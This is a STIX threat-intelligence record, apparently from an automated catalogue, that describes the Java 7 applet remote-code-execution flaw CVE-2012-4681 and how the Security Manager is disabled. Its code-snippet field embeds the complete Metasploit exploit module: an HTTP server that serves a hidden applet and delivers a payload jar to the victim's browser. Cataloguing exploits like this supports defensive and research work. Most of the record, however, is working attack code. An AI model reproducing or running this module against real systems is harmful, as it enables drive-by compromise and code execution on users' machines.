{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4373938d-de88-4419-81f7-2808f69fd56e",
    "created": "2024-08-14T17:06:11.033213Z",
    "modified": "2024-08-14T17:06:11.033218Z",
    "name": "Java 7 Applet Remote Code Execution",
    "description": " The exploit takes advantage of two issues in JDK 7: The ClassFinder and MethodFinder.findMethod().  Both were newly introduced in JDK 7.  ClassFinder is a replacement for classForName back in JDK 6. It allows untrusted code to obtain a reference and have access to a restricted package in JDK 7, which can be used to abuse sun.awt.SunToolkit (a restricted package).  With sun.awt.SunToolkit, we can actually invoke getField() by abusing findMethod() in Statement.invokeInternal() (but getField() must be public, and that's not always the case in JDK 6) in order to access Statement.acc's private field, modify AccessControlContext, and then disable Security Manager. Once Security Manager is disabled, we can execute arbitrary Java code.  Our exploit has been tested successfully against multiple platforms, including: IE, Firefox, Safari, Chrome; Windows, Ubuntu, OS X, Solaris, etc.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_jre17_exec.rb",
            "external_id": "java_jre17_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4681"
        },
        {
            "source_name": "reference",
            "url": "http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.deependresearch.org/2012/08/java-7-vulnerability-analysis.html"
        },
        {
            "source_name": "reference",
            "url": "http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/"
        },
        {
            "source_name": "reference",
            "url": "http://www.deependresearch.org/2012/08/java-7-0-day-vulnerability-information.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/alert-cve-2012-4681-1835715.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/08/27/lets-start-the-week-with-a-new-java-0day"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=852051"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n    super( update_info( info,\n      'Name'          => 'Java 7 Applet Remote Code Execution',\n      'Description'   => %q{\n        The exploit takes advantage of two issues in JDK 7: The ClassFinder and\n        MethodFinder.findMethod().  Both were newly introduced in JDK 7.  ClassFinder is a\n        replacement for classForName back in JDK 6. It allows untrusted code to obtain a\n        reference and have access to a restricted package in JDK 7, which can be used to\n        abuse sun.awt.SunToolkit (a restricted package).  With sun.awt.SunToolkit, we can\n        actually invoke getField() by abusing findMethod() in Statement.invokeInternal()\n        (but getField() must be public, and that's not always the case in JDK 6) in order\n        to access Statement.acc's private field, modify AccessControlContext, and then\n        disable Security Manager. Once Security Manager is disabled, we can execute\n        arbitrary Java code.\n\n        Our exploit has been tested successfully against multiple platforms, including:\n        IE, Firefox, Safari, Chrome; Windows, Ubuntu, OS X, Solaris, etc.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Adam Gowdiak',  # Vulnerability discovery according to Oracle's advisory\n          'James Forshaw', # Vulnerability discovery according to Oracle's advisory\n          'jduck',         # metasploit module\n          'sinn3r',        # metasploit module\n          'juan vazquez'   # metasploit module\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2012-4681' ],\n          [ 'OSVDB', '84867' ],\n          [ 'URL', 'http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html' ],\n          [ 'URL', 'http://www.deependresearch.org/2012/08/java-7-vulnerability-analysis.html' ],\n          [ 'URL', 'http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/' ],\n          [ 'URL', 'http://www.deependresearch.org/2012/08/java-7-0-day-vulnerability-information.html' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/alert-cve-2012-4681-1835715.html' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/08/27/lets-start-the-week-with-a-new-java-0day' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=852051']\n        ],\n      'Platform'      => %w{ java linux win },\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ],\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux x86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-08-26'\n      ))\n  end\n\n\n  def on_request_uri( cli, request )\n\n    if not request.uri.match(/\\.jar$/i)\n      if not request.uri.match(/\\/$/)\n        send_redirect(cli, get_resource() + '/', '')\n        return\n      end\n\n      print_status(\"#{self.name} handling request\")\n\n      send_response_html( cli, generate_html, { 'Content-Type' => 'text/html' } )\n      return\n    end\n\n    paths = [\n      [ \"Exploit.class\" ]\n    ]\n\n    p = regenerate_payload(cli)\n\n    jar  = p.encoded_jar\n    paths.each do |path|\n      1.upto(path.length - 1) do |idx|\n        full = path[0,idx].join(\"/\") + \"/\"\n        if !(jar.entries.map{|e|e.name}.include?(full))\n          jar.add_file(full, '')\n        end\n      end\n      fd = File.open(File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2012-4681\", path ), \"rb\")\n      data = fd.read(fd.stat.size)\n      jar.add_file(path.join(\"/\"), data)\n      fd.close\n    end\n\n    print_status(\"Sending Applet.jar\")\n    send_response( cli, jar.pack, { 'Content-Type' => \"application/octet-stream\" } )\n\n    handler( cli )\n  end\n\n  def generate_html\n    html  = \"<html><head></head>\"\n    html += \"<body>\"\n    html += \"<applet archive=\\\"Exploit.jar\\\" code=\\\"Exploit.class\\\" width=\\\"1\\\" height=\\\"1\\\">\"\n    html += \"</applet></body></html>\"\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-26",
    "x_mitre_platforms": [
        "linux"
    ]
}